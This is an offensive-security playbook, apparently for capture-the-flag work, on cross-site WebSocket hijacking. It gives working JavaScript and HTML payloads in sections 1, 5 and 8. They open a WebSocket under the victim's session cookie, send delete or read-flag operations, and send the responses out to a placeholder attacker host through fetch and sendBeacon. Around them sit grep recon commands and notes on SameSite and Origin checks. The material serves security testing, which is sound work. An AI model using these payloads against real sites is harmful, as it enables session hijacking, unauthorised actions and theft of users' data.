# WebSocket CSRF — the ws/wss channel opened cross-origin

A `ws://`/`wss://` connection opened from an attacker page carries
the session cookie on the upgrade handshake — "cross-site WebSocket
hijacking". It's CSRF-shaped but for a persistent channel.

---

## 1. The primitive

```js
var ws = new WebSocket('wss://target/ws');
ws.onopen = () => ws.send(JSON.stringify({op:'delete', id:1}));
ws.onmessage = e => fetch('https://attacker/?d='+encodeURIComponent(e.data));
```

The `ws:`/`wss:` handshake is an HTTP GET with `Upgrade: websocket`
— cookies attach per the cookie rules, and the origin header is
`https://attacker.com`. If the server doesn't check Origin on the
handshake, the cross-site channel opens.

## 2. The SameSite question on ws — engine-dependent

```text
historically ws handshakes ignored SameSite — cookies attached
regardless. modern Chrome applies Lax-ish rules to ws too, but the
behavior varies by engine and version:
- older chromium/Firefox: cookie attaches regardless of SameSite
- newer engines: Lax blocks ws cross-site like other sub-requests
the probe: does the handshake carry the cookie? capture it or test.
```

## 3. The two gates — handshake-Origin + message-auth

```text
Gate 1 — the handshake's Origin: does the server check
  req.headers['origin'] on the upgrade? a missing/weak check = the
  cross-site channel opens.
Gate 2 — per-message auth: does each ws message re-authenticate, or
  is the handshake's session enough for the channel's life?
```

```bash
grep -rnoE 'origin|Origin|Upgrade|websocket|ws\.|socket\.io|Sec-WebSocket' <src> | head -20
```

## 4. The ws-write vs the http-write

```text
a ws channel is persistent — one handshake, many messages:
- the CSRF page opens the ws channel once
- it can send a STREAM of writes (not just one request)
- it can READ the responses (unlike a fire-and-forget http CSRF)
```

The ws-hijack is strictly stronger than http CSRF — it's a write
AND a read channel under the victim's session.

## 5. The read-capability — what ws-CSRF buys that http-CSRF doesn't

```js
var ws=new WebSocket('wss://t/ws');
ws.onopen=()=>ws.send(JSON.stringify({op:'get_flag'}));
ws.onmessage=e=>{
  // the response is READABLE — unlike an http CSRF — the ws channel
  // is same-connection; the server streams the result back
  fetch('https://attacker/?d='+btoa(e.data));
};
```

The ws channel returns data — the flag can come back over the ws
and exfil to you. An http CSRF can't read its response.

## 6. The cookie-attach on the handshake

```text
the ws handshake's Cookie header carries the session per SameSite:
- SameSite=None+Secure → attaches
- missing → engine-dependent
- Lax → modern engines block it for ws too
- the handshake is a 'websocket' Sec-Fetch-Mode
```

## 7. The socket.io / SockJS variants

```js
// socket.io — the polling handshake is a normal http request first
var s=io('https://t',{withCredentials:true});
s.emit('write',{a:1});
// the polling transport's http requests carry cookies like fetch
```

```bash
grep -rnoE 'socket\.io|sockjs|io\(|new WebSocket|ws://|wss://' <src> | head -20
```

## 8. The ws-write for the bot — the persistent exfil

```html
<!-- a CSRF page that opens a ws channel and exfils what the bot's
     session can read -->
<script>
var ws=new WebSocket('wss://t/ws');
ws.onopen=()=>ws.send(JSON.stringify({op:'read_flag'}));
ws.onmessage=e=>navigator.sendBeacon('https://attacker/x',e.data);
</script>
```

## 9. The falsifier

```text
- the ws handshake enforces Origin exactly → the cross-site channel
  is refused
- SameSite blocks the cookie on the handshake → no auth
- per-message auth re-checks → the channel dies after the handshake
- no ws/wss endpoint exists → not this class
```

## 10. The boundary — ws-hijack vs http-CSRF vs XS-leaks

```text
ws-hijack is INSIDE the CSRF family — a cross-origin write via the
browser — but with a read channel. web-websocket covers the ws-
specific auth/protocol depth. when the write is a ws channel, open
web-websocket; when it's an http request, stay here.
```

## 11. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "ws-csrf: wss channel + cookie-auth, no Origin check -> read+write"
```
